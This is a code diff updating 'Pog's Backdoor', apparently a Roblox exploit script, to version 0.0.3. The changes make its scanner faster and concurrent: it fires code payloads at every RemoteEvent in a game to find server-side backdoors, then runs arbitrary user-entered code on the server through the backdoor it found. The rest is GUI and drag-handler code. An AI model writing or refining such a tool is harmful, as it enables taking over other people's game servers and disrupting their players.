@@ -1,5 +1,5 @@
 -- Pog's Backdoor
--- 0.0.2
+-- 0.0.3
 
 
 
@@ -216,7 +216,7 @@ Check_1.BorderSizePixel = 0
 Check_1.Position = UDim2.new(0.00192307692, 0,0.304511279, 0)
 Check_1.Size = UDim2.new(0, 519,0, 104)
 Check_1.Font = Enum.Font.SourceSans
-Check_1.Text = "Checking for backdoor... (might take some time)"
+Check_1.Text = "Checking for backdoor...\nIf your game froze - dw, its scanning!"
 Check_1.TextColor3 = Color3.fromRGB(255,255,255)
 Check_1.TextScaled = true
 Check_1.TextSize = 14
@@ -297,11 +297,11 @@ Txt_1.ClearTextOnFocus = false
 Txt_1.MultiLine = true
 Txt_1.Position = UDim2.new(0.0494969226, 0,0.176691726, 0)
 Txt_1.Size = UDim2.new(0, 468,0, 140)
-Txt_1.Font = Enum.Font.Code
+Txt_1.Font = Enum.Font.Ubuntu
 Txt_1.PlaceholderText = "Code here..."
 Txt_1.Text = ""
 Txt_1.TextColor3 = Color3.fromRGB(255,255,255)
-Txt_1.TextSize = 15
+Txt_1.TextSize = 18
 Txt_1.TextStrokeTransparency = 0
 Txt_1.TextWrapped = true
 Txt_1.TextXAlignment = Enum.TextXAlignment.Left
@@ -542,6 +542,55 @@ end)
 end
 coroutine.wrap(rAdKcxXshhbytUjT)()
 
+local function udNFTUCfWJTVptqQ()
+local script = Instance.new("LocalScript",Minimizer_1)
+
+local UserInputService = game:GetService("UserInputService")
+
+local gui = script.Parent
+game:GetService("RunService").RenderStepped:Connect(function()
+	script.Parent.UIStroke.UIGradient.Rotation = (script.Parent.UIStroke.UIGradient.Rotation + 1) % 360
+end)
+
+local dragging
+local dragInput
+local dragStart
+local startPos
+
+local function update(input)
+	local delta = input.Position - dragStart
+	gui.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+end
+
+gui.InputBegan:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+		dragging = true
+		dragStart = input.Position
+		startPos = gui.Position
+
+		input.Changed:Connect(function()
+			if input.UserInputState == Enum.UserInputState.End then
+				dragging = false
+			end
+		end)
+	end
+end)
+
+gui.InputChanged:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+		dragInput = input
+	end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+	if input == dragInput and dragging then
+		update(input)
+	end
+end)
+end
+coroutine.wrap(udNFTUCfWJTVptqQ)()
+
+
 
 local function PsGxzsgLMXexCQYx()
 local script = Instance.new("LocalScript",Frame_1)
@@ -592,75 +641,110 @@ UserInputService.InputChanged:Connect(function(input)
 	end
 end)
 local RunService = game:GetService("RunService")
-local foundEvent = false
+
+-- List of known Roblox remote events that are not exploitable
+local excludedRemotes = {
+    "UpdateCurrentCall",
+    "CanChatWith",
+    "OnNewMessage",
+    "OnMessageDoneFiltering",
+    "OnChannelJoined",
+    "OnNewSystemMessage",
+    -- Add more known Roblox remote events here
+}
+
+local remoteEvent = nil
 local FinishedFound = false
-
-local function testRemote(remote)
-	local modelName = "PogBackdoor"
-	print("Checking RemoteEvent:", remote:GetFullName())
-	local function onAdded(instance)
-		if instance:IsDescendantOf(workspace) and instance.Name == modelName then
-			foundEvent = true
-		end
-	end
-
-	local connection = workspace.ChildAdded:Connect(onAdded)
-	remote:FireServer([[ 
-        local model = Instance.new("Message") 
-        model.Name = "PogBackdoor"
-        model.Parent = workspace 
-    ]])
-	local startTime = tick()
-	while tick() - startTime < 0.5 do
-		if foundEvent then break end
-		RunService.Heartbeat:Wait()
-	end
-	connection:Disconnect()
-	print(foundEvent and "✅ RemoteEvent is exploitable!" or "❌ RemoteEvent failed.")
-	return foundEvent
-end
-
-local remoteEvent
 local remotes = {}
-for _, remote in ipairs(game:GetDescendants()) do
-	if remote:IsA("RemoteEvent") and remote.Name ~= "UpdateCurrentCall" and remote.Name ~= "CanChatWith" then
-		table.insert(remotes, remote)
-	end
+local foundExploit = false  -- global flag to signal that an exploitable remote has been found
+
+-- Function to test if a remote is exploitable
+local function testRemote(remote)
+    if foundExploit then return end  -- skip if another remote is already found
+
+    local randomId = tostring(math.random(1, 1e6))
+    local modelName = "PogBackdoor_" .. randomId
+    print("ℹ️ Checking Remote:", remote:GetFullName())
+
+    local foundEvent = false
+
+    local function onAdded(instance)
+        if instance.Name == modelName then
+            foundEvent = true
+        end
+    end
+
+    local connection = workspace.DescendantAdded:Connect(onAdded)
+    remote:FireServer([[local m=Instance.new("Part") m.Name="]] .. modelName .. [[" m.Parent=workspace]])
+
+    local startTime = tick()
+    while tick() - startTime < 0.2 do  -- using a short timeout (~0.2 sec)
+        if foundEvent or workspace:FindFirstChild(modelName, true) then
+            foundEvent = true
+            break
+        end
+        RunService.Heartbeat:Wait()
+    end
+
+    connection:Disconnect()
+
+    if foundEvent then
+        print("✅ Backdoor found!")
+        if not foundExploit then
+            foundExploit = true
+            remoteEvent = remote
+        end
+    else
+        print("❌ Remote Backdoor failed", remote:GetFullName())
+    end
 end
 
-local index = 1
+-- Function to find an exploitable remote concurrently
 local function findRemote()
-	if remoteEvent then return end
-	for i = 1, 10 do
-		if index > #remotes then
-			FinishedFound = true
-			print("❌ Finished scanning. No exploitable RemoteEvent found.")
-			return
-		end
-		local remote = remotes[index]
-		index += 1
-		if remote.Name ~= "UpdateCurrentCall" and remote.Name ~= "CanChatWith" then 
-			if testRemote(remote) then
-				remoteEvent = remote
-				print("✅ Using RemoteEvent:", remote:GetFullName())
-				return
-			end
-		end
-	end
-	task.wait(0.05)
-	findRemote()
+    -- Gather all candidate RemoteEvents
+    for _, remote in ipairs(game:GetDescendants()) do
+        if remote:IsA("RemoteEvent") and not table.find(excludedRemotes, remote.Name) then
+            table.insert(remotes, remote)
+        end
+    end
+
+    -- Test each remote concurrently
+    for _, remote in ipairs(remotes) do
+        task.spawn(function()
+            if not foundExploit then
+                testRemote(remote)
+            end
+        end)
+    end
+
+    -- Wait for a short overall duration or until one is found
+    local overallTimeout = 5
+    local start = tick()
+    repeat
+        task.wait(0.01)
+    until foundExploit or (tick() - start > overallTimeout)
+
+    FinishedFound = true
+
+    if remoteEvent then
+        print("✅ Using Backdoor:", remoteEvent:GetFullName())
+    else
+        print("⚠ No Backdoor found.")
+    end
 end
 
+-- Function to fire code through the exploitable remote
+local function fireRemoteEvent(code)
+    if remoteEvent then
+        print("ℹ️ Executing code through backdoor:", remoteEvent:GetFullName())
+        remoteEvent:FireServer(code)
+    else
+        warn("⚠ No backdoor found, cannot execute code.")
+    end
+end
+task.wait(0.8)
 task.spawn(findRemote)
 
-local function fireRemoteEvent(code)
-	if remoteEvent then
-		print("ℹ️ Executing code through:", remoteEvent:GetFullName()) -- Debug print
-		remoteEvent:FireServer(code)
-	else
-		warn("⚠ No exploitable RemoteEvent found, cannot execute code.")
-	end
-end
 
 repeat task.wait() until FinishedFound or remoteEvent
 if not remoteEvent then
@@ -670,7 +754,7 @@ else
 	script.Parent.FrameExec.Visible = true
 	game.StarterGui:SetCore("SendNotification",{
 		Title = "Pog Backdoor Scanner",
-		Text = "Backdoor found! Time to have fun..",
+		Text = "Backdoor found! Backdoor: " .. remoteEvent:GetFullName(),
 		Duration = 5
 	})
 end
@@ -716,51 +800,4 @@ end
 coroutine.wrap(PsGxzsgLMXexCQYx)()
 
 
-local function udNFTUCfWJTVptqQ()
-local script = Instance.new("LocalScript",Minimizer_1)
-
-local UserInputService = game:GetService("UserInputService")
-
-local gui = script.Parent
-game:GetService("RunService").RenderStepped:Connect(function()
-	script.Parent.UIStroke.UIGradient.Rotation = (script.Parent.UIStroke.UIGradient.Rotation + 1) % 360
-end)
-
-local dragging
-local dragInput
-local dragStart
-local startPos
-
-local function update(input)
-	local delta = input.Position - dragStart
-	gui.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
-end
-
-gui.InputBegan:Connect(function(input)
-	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-		dragging = true
-		dragStart = input.Position
-		startPos = gui.Position
-
-		input.Changed:Connect(function()
-			if input.UserInputState == Enum.UserInputState.End then
-				dragging = false
-			end
-		end)
-	end
-end)
-
-gui.InputChanged:Connect(function(input)
-	if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
-		dragInput = input
-	end
-end)
-
-UserInputService.InputChanged:Connect(function(input)
-	if input == dragInput and dragging then
-		update(input)
-	end
-end)
-end
-coroutine.wrap(udNFTUCfWJTVptqQ)()
 
